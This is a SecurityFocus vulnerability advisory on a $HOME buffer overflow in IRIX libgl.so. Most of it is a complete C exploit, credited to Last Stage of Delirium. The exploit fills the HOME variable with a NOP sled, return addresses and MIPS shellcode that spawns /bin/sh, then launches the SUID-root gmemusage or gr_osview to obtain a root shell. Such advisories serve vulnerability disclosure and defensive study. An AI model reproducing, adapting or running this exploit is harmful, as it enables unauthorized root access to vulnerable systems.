source: http://www.securityfocus.com/bid/1527/info


Certain versions of IRIX ship with a version libgl.so which is vulnerable to buffer overflow attacks. This library, libgl.so, is used in conjunction with graphical programs which use OpenGL. As a result a number of programs which utilize libgl.so can be exploited via this problem. The exploit which is in known public circulation at this time uses both gmemusage and gr_osview to exploit this problem. The buffer overflow itself is in how libgl.so handles the $HOME variable is handled (it is not checked for length). Further the programs which receive this $HOME variable from libgl.so further fail to limit it's size resulting in a buffer overflow attack. Should the receiving programs be SUID root (as are both gr_osview and gmemusage) the attacker will gain root access. 

                /*## copyright LAST STAGE OF DELIRIUM sep 1997 poland        *://lsd-pl.net/ #*/
                /*## libgl.so $HOME                                                          #*/

                #define ADRNUM 500
                #define PCHNUM 320
                #define TMPNUM 500
                #define NOPNUM 740
                #define ALLIGN 3

                char shellcode[]=
                    "\x04\x10\xff\xff"    /* bltzal  $zero,<shellcode>    */
                    "\x24\x02\x03\xf3"    /* li      $v0,1011             */
                    "\x23\xff\x01\x14"    /* addi    $ra,$ra,276          */
                    "\x23\xe4\xff\x08"    /* addi    $a0,$ra,-248         */
                    "\x23\xe5\xff\x10"    /* addi    $a1,$ra,-240         */
                    "\xaf\xe4\xff\x10"    /* sw      $a0,-240($ra)        */
                    "\xaf\xe0\xff\x14"    /* sw      $zero,-236($ra)      */
                    "\xa3\xe0\xff\x0f"    /* sb      $zero,-241($ra)      */
                    "\x03\xff\xff\xcc"    /* syscall                      */
                    "/bin/sh"
                ;

                char jump[]=
                    "\x03\xa0\x10\x25"    /* move    $v0,$sp              */
                    "\x03\xe0\x00\x08"    /* jr      $ra                  */
                ;

                char nop[]="\x24\x0f\x12\x34";

                main(int argc,char **argv){
                    char buffer[10000],adr[4],pch[4],tmp[4],*b,*envp[2];
                    int i,n=-1;

                    printf("copyright LAST STAGE OF DELIRIUM sep 1997 poland  //lsd-pl.net/\n");
                    printf("libgl.so $HOME for irix 6.2 IP:20,22\n\n");

                    if(argc!=2){
                        printf("usage: %s {gmemusage|gr_osview}\n",argv[0]);
                        exit(-1);
                    }
                    if(!strcmp(argv[1],"gmemusage")) n=0;
                    if(!strcmp(argv[1],"gr_osview")) n=1;
                    if(n==-1) exit(-1);

                    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+10268+252+824+500;
                    *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+10268+252+824+31868;
                    *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+10268;

                    envp[0]=buffer;
                    envp[1]=0;

                    b=buffer;
                    sprintf(b,"HOME=");
                    b+=5;
                    for(i=0;i<ALLIGN;i++) *b++=0xff;
                    for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];
                    *b++=0xff;
                    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
                    for(i=0;i<ALLIGN;i++) *b++=0xff;
                    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
                    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
                    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i]; 
                    *b=0;

                    switch(n){
                    case 0: execle("/usr/sbin/gmemusage","lsd",0,envp);
                    case 1: execle("/usr/sbin/gr_osview","lsd",0,envp);
                    }
                }
